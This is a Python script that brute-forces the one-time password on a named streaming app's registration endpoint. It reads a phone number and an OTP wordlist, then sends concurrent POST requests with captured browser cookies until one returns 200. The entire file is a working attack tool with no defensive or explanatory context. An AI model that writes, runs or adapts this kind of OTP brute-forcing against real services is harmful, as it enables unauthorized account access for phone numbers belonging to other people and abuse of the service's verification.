import json
import requests
from concurrent.futures import ThreadPoolExecutor

num=input("Enter the number :")
url = "https://ullu.app/ulluCore/api/v1/consumer/register/otp/cdiOpn"
headers = {
    "Cookie": "_fbp=fb.1.1674390267568.1828679321; __stripe_mid=94cefecf-ba5e-4e56-abef-ae50b537b3bd775a88; __stripe_sid=e7868c07-1bdb-4f4e-b599-73be1004784ffa6f59; _ga_QPY6BPK7QN=GS1.1.1674390294.1.1.1674391635.0.0.0; _ga=GA1.1.487147000.1674390295",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/json",
    "Origin": "https://ullu.app",
    "Referer": "https://ullu.app/",
    "Te": "trailers"
}
otp_file = input("Enter the path of the OTP file: ")
with open(otp_file, "r") as f:
    otps = f.read().splitlines()

def send_request(otp):
    data = {"fullname": None, "mobileNumber": num, "otpText": otp}
    response = requests.post(url, headers=headers, json=data)
    if response.status_code == 200:
        print("OTP {} is correct, response: 200 OK".format(otp))
        exit(0)
    else:
        print("OTP {} is incorrect, response: {}".format(otp, response.status_code))



with ThreadPoolExecutor() as executor:
    # Submit all OTPs to the executor
    results = [executor.submit(send_request, otp) for otp in otps]


